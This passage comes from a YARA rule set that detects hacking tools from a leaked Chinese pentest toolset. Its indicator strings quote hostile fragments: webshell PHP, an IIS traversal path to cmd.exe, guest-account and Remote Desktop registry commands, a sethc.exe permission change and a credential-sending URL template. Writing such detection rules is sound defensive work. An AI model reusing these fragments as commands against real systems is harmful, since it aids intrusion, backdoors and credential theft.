( 0 ) == 0x5a4d and filesize < 700KB and all of them\n}\n\nrule CN_Honker_GetHashes_2_RID2ED4 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file GetHashes.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:31:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GetHashes.exe <SAM registry file> [System key file]\" fullword ascii\n      $s2 = \"GetHashes.exe $Local\" fullword ascii\n      $s3 = \"The system key doesn't match SAM registry file!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them\n}\n\nrule Generic_KeyGen_Patcher_RID2F96 : CHINA DEMO EXE FILE GEN HKTL {\n   meta:\n      description = \"Keygen from CN Honker Pentest Toolset - file Acunetix_Web_Vulnerability_Scanner_8.x_Enterprise_Edition_KeyGen.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:03:31\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, GEN, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<description>Patch</description>\" fullword ascii\n      $s2 = \"\\\\dup2patcher.dll\" ascii\n      $s3 = \"load_patcher\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them\n}\n\nrule CN_Honker_Tuoku_script_oracle_2_RID3339 : CHINA DEMO HKTL SCRIPT {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file oracle.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:38:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, HKTL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"webshell\" fullword ascii\n      $s1 = \"Silic Group Hacker Army \" fullword ascii\n   condition: \n      filesize < 3KB and all of them\n}\n\nrule CN_Honker_net_packet_capt_RID30EC : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file net_packet_capt.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:00:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"(*.sfd)\" fullword ascii\n      $s2 = \"GetLaBA\" fullword ascii\n      $s3 = \"GAIsProcessorFeature\" fullword ascii\n      $s4 = \"- Gablto \" ascii\n      $s5 = \"PaneWyedit\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them\n}\n\nrule CN_Honker_CleanIISLog_RID2EB1 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file CleanIISLog.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:25:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage: CleanIISLog <LogFile>|<.> <CleanIP>|<.>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule CN_Honker_HASH_pwhash_RID2ED5 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file pwhash.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:31:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Example: quarks-pwdump.exe --dump-hash-domain --with-history\" fullword ascii\n      $s2 = \"quarks-pwdump.exe <options> <NTDS file>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them\n}\n\nrule CN_Honker_SqlMap_Python_Run_RID318A : CHINA DEMO EXE FILE HKTL SCRIPT T1059_006 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Run.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:26:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, SCRIPT, T1059_006\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".\\\\Run.log\" fullword ascii\n      $s2 = \"[root@Hacker~]# Sqlmap \" fullword ascii\n      $s3 = \"%sSqlmap %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them\n}\n\nrule CN_Honker_SAMInside_RID2E04 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file SAMInside.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:56:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"www.InsidePro.com\" fullword wide\n      $s1 = \"SAMInside.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 650KB and all of them\n}\n\nrule CN_Honker_WebScan_wwwscan_RID30D3 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file wwwscan.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:56:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s www.target.com -p 8080 -m 10 -t 16\" fullword ascii\n      $s2 = \"GET /nothisexistpage.html HTTP/1.1\" fullword ascii\n      $s3 = \"<Usage>:  %s <HostName|Ip> [Options]\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them\n}\n\nrule CN_Honker_sig_3389_2_3389_RID2F07 : CHINA DEMO EXE FILE HKTL T1087_002 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file 3389.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:39:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1087_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\Documents and Settings\\\\Administrator\\\\\" ascii\n      $s2 = \"net user guest /active:yes\" fullword ascii\n      $s3 = \"\\\\Microsoft Word.exe\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them\n}\n\nrule CN_Honker_PHP_php11_RID2DB8 : CHINA DEMO HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file php11.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:43:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<tr><td><b><?php if (!$win) {echo wordwrap(myshellexec('id'),90,'<br>',1);} else\" ascii\n      $s2 = \"foreach (glob($_GET['pathtomass'].\\\"/*.htm\\\") as $injectj00) {\" fullword ascii\n      $s3 = \"echo '[cPanel Found] '.$login.':'.$pass.\\\"  Success\\\\n\\\";\" fullword ascii\n   condition: \n      filesize < 800KB and all of them\n}\n\nrule CN_Honker_WebCruiserWVS_RID2FC2 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file WebCruiserWVS.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:10:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"id:uid:user:username:password:access:account:accounts:admin_id:admin_name:admin_\" ascii\n      $s1 = \"Created By WebCruiser - Web Vulnerability Scanner http://sec4app.com\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them\n}\n\nrule CN_Honker_Hookmsgina_RID2ED7 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Hookmsgina.dll\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:31:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\\\\\.\\\\pipe\\\\WinlogonHack\" fullword ascii\n      $s2 = \"%s?host=%s&domain=%s&user=%s&pass=%s&port=%u\" fullword ascii\n      $s3 = \"Global\\\\WinlogonHack_Load%u\" fullword ascii\n      $s4 = \"Hookmsgina.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule CN_Honker_sig_3389_xp3389_RID2F5E : CHINA DEMO EXE FILE HKTL T1543_003 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file xp3389.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:54:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"fdenytsconnections\\\"=dword:00000000 >> c:\\\\reg.reg\" fullword ascii\n      $s2 = \"echo [HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server] >\" ascii\n      $s3 = \"echo \\\"Tsenabled\\\"=dword:00000001 >> c:\\\\reg.reg\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and all of them\n}\n\nrule CN_Honker_CookiesView_RID2F2F : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file CookiesView.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:46:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"V1.0  Http://www.darkst.com Code:New4\" fullword ascii\n      $s1 = \"maotpo@126.com\" fullword ascii\n      $s2 = \"www.baidu.com\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 640KB and all of them\n}\n\nrule CN_Honker_T00ls_Lpk_Sethc_v4_LPK_RID3285 : CHINA DEMO EXE FILE HKTL T1546_008 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file LPK.DAT\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:08:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1546_008\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://127.0.0.1/1.exe\" fullword wide\n      $s2 = \"FreeHostKillexe.exe\" fullword ascii\n      $s3 = \"\\\\sethc.exe /G everyone:F\" ascii\n      $s4 = \"c:\\\\1.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them\n}\n\nrule CN_Honker_ScanHistory_RID2F3E : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ScanHistory.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:48:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ScanHistory.exe\" fullword wide\n      $s2 = \".\\\\Report.dat\" fullword wide\n      $s3 = \"select  * from  Results order by scandate desc\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule CN_Honker_InvasionErasor_RID307A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file InvasionErasor.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:41:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"c:\\\\windows\\\\system32\\\\config\\\\*.*\" fullword wide\n      $s2 = \"c:\\\\winnt\\\\*.txt\" fullword wide\n      $s3 = \"Command1\" fullword ascii\n      $s4 = \"Win2003\" fullword ascii\n      $s5 = \"Win 2000\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them\n}\n\nrule CN_Honker_super_Injection1_RID3129 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file super Injection1.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:10:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Invalid owner=This control requires version 4.70 or greater of COMCTL32.DLL\" fullword wide\n      $s3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n      $s4 = \"ScanInject.log\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule CN_Honker_Pk_Pker_RID2D73 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Pker.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:32:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/msadc/..%5c..%5c..%5c..%5cwinnt/system32/cmd.exe\" fullword wide\n      $s2 = \"msadc/..\\\\..\\\\..\\\\..\\\\winnt/system32/cmd.exe\" fullword wide\n      $s3 = \"--Made by VerKey&Only_Guest&Bincker\" fullword wide\n      $s4 = \";APPLET;EMBED;FRAMESET;HEAD;NOFRAMES;NOSCRIPT;OBJECT;SCRIPT;STYLE;\" fullword wide\n      $s5 = \" --Welcome to Www.Pker.In Made by V.K\" fullword wide\n      $s6 = \"Report.dat\" fullword wide\n      $s7 = \".\\\\Report.dat\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 5 of them\n}\n\nrule CN_Honker_GetPass_GetPass_RID3094 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file GetPass.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:45:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\only\\\\Desktop\\\\\" ascii\n      $s2 = \"To Run As Administuor\" ascii\n      $s3 = \"Key to EXIT ... & pause > nul\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule CN_Honker_F4ck_Team_F4ck_3_RID302E : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file F4ck_3.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:28:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"F4ck.exe\" fullword wide\n      $s2 = \"@Netapi32.dll\" fullword ascii\n      $s3 = \"Team.F4ck.Net\" fullword wide\n      $s6 = \"NO Net Add User\" fullword wide\n      $s7 = \"DLL ERROR\" fullword ascii\n      $s11 = \"F4ck Team\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 3 of them\n}\n\nrule CN_Honker_ACCESS_brute_RID2EFA : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ACCESS_brute.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:37:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".dns166.co\" ascii\n      $s2 = \"SExecuteA\" ascii\n      $s3 = \"ality/clsCom\" ascii\n      $s4 = \"NT_SINK_AddRef\" ascii\n      $s5 = \"WINDOWS\\\\Syswm\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and all of them\n}\n\nrule CN_Honker_Fpipe_FPipe_RID2EEE : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file FPipe.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:35:31\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Unable to create TCP listen socket. %s%d\" fullword ascii\n      $s2 = \"http://www.foundstone.com\" fullword ascii\n      $s3 = \"%s %s port %d. Address is already in use\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and all of them\n}\n\nrule CN_Honker_Layer_Layer_RID2F20 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Layer.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:43:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Release\\\\Layer.pdb\" ascii\n      $s2 = \"Layer.exe\" fullword wide\n      $s3 = \"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule CN_Honker_ms10048_x86_RID2DE9 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ms10048-x86.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:52:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them\n}\n\nrule CN_Honker_HTran2_4_RID2D69 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file HTran2.4.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:30:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Enter Your Socks Type No: [0.BindPort 1.ConnectBack 2.Listen]:\" fullword ascii\n      $s2 = \"[+] New connection %s:%d !!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 180KB and all of them\n}\n\nrule CN_Honker_SkinHRootkit_SkinH_RID31CC : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file SkinH.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:37:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"(C)360.cn Inc.All Rights Reserved.\" fullword wide\n      $s1 = \"SDVersion.dll\" fullword wide\n      $s2 = \"skinh.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule CN_Honker__PostgreSQL_mysql_injectV1_1_Creak_Oracle_SQLServer_inject_Creaked_RID442C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - from files PostgreSQL.exe, mysql_injectV1.1_Creak.exe, Oracle.exe, SQLServer_inject_Creaked.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 02:41:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a1f066789f48a76023598c5777752c15f91b76b0\"\n      hash2 = \"0264f4efdba09eaf1e681220ba96de8498ab3580\"\n      hash3 = \"af3c41756ec8768483a4cf59b2e639994426e2c2\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"zhaoxypass@yahoo.com.cn\" fullword ascii\n      $s2 = \"Mozilla/3.0 (compatible; Indy Library)\" fullword ascii\n      $s3 = \"ProxyParams.ProxyPort\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and all of them\n}\n\nrule CN_Honker__wwwscan_wwwscan_wwwscan_gui_RID36A6 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - from files wwwscan.exe, wwwscan.exe, wwwscan_gui.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 17:04:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6bed45629c5e54986f2d27cbfc53464108911026\"\n      hash2 = \"897b66a34c58621190cb88e9b2a2a90bf9b71a53\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GET /nothisexistpage.html HTTP/1.1\" fullword ascii\n      $s2 = \"<Usage>:  %s <HostName|Ip> [Options]\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule CN_Honker__LPK_LPK_LPK_RID2E99 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - from files LPK.DAT, LPK.DAT, LPK.DAT\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:21:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2b2ab50753006f62965bba83460e3960ca7e1926\"\n      hash2 = \"cf2549bbbbdb7aaf232d9783873667e35c8d96c1\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\" fullword wide\n      $s2 = \"Password error!\" fullword ascii\n      $s3 = \"\\\\sathc.exe\" ascii\n      $s4 = \"\\\\sothc.exe\" ascii\n      $s5 = \"\\\\lpksethc.bat\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1057KB and all of them\n}\n\nrule CN_Honker__builder_shift_SkinH_RID32C6 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - from files builder.exe, shift.exe, SkinH.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:19:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ee127c1ea1e3b5bf3d2f8754fabf9d1101ed0ee0\"\n      hash2 = \"d593f03ae06e54b653c7850c872c0eed459b301f\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"lipboard\" fullword ascii\n      $s2 = \"uxthem\" fullword ascii\n      $s3 = \"ENIGMA\" fullword ascii\n      $s4 = \"UtilW0ndow\" fullword ascii\n      $s5 = \"prog3am\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 6075KB and all of them\n}\n\nrule CN_Honker__lcx_HTran2_4_htran20_RID324C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - from files lcx.exe, HTran2.4.exe, htran20.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:59:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"524f986692f55620013ab5a06bf942382e64d38a\"\n      hash2 = \"b992bf5b04d362ed3757e90e57bc5d6b2a04e65c\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[SERVER]connection to %s:%d error\" fullword ascii\n      $s2 = \"[+] OK! I Closed The Two Socket.\" fullword ascii\n      $s3 = \"[+] Start Transmit (%s:%d <-> %s:%d) ......\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 440KB and all of them\n}\n\nrule CN_Honker__D_injection_V2_32_D_injection_V2_32_D_injection_V2_32_RID3E17 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - from files D_injection_V2.32.exe, D_injection_V2.32.exe, D_injection_V2.32.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest 